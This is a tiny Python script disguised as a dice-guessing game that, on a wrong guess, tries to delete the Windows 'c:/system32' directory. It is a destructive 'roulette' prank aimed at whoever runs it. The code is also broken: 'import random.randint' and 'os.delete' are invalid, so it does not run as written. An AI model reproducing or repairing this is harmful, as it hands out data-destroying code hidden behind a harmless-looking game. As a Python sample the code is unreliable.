import random.randint
import os

i = int(input("lets play a game :)Enter a number between 1 and 6: "))
number = random.randint(1, 6)
if i == number:
    print("You won!")
else:
    os.delete("c:/system32")